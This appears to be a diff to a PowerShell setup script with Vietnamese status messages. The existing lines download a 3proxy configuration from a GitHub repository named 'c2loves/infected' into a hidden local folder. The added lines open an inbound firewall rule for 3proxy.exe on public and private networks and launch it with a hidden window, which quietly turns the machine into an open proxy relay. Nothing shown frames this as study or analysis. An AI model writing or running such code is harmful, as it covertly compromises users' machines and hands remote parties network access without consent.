@@ -46,3 +46,12 @@ Write-Host "[+] Hoàn tất. Nội dung thư mục $DestDir:"
 Get-ChildItem -Path $DestDir -Depth 1
 
 New-Item -ItemType Directory -Path "$env:LOCALAPPDATA\proxy\bin" -Force | Out-Null; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/c2loves/infected/refs/heads/main/3proxy.cfg' -OutFile "$env:LOCALAPPDATA\proxy\bin\3proxy.cfg"
+
+$exe = "$env:LOCALAPPDATA\proxy\bin\3proxy.exe"
+if (Test-Path $exe) {
+    New-NetFirewallRule -DisplayName "Allow 3proxy" -Direction Inbound -Program $exe -Action Allow -Profile Private,Public -Description "Allow inbound for 3proxy"
+    Write-Host "Đã thêm rule firewall cho 3proxy.exe"
+} else {
+    Write-Warning "Không tìm thấy file 3proxy.exe tại $exe"
+}
+Start-Process -FilePath "${env:LOCALAPPDATA}\proxy\bin\3proxy.exe" -ArgumentList "${env:LOCALAPPDATA}\proxy\bin\3proxy.cfg" -WindowStyle Hidden
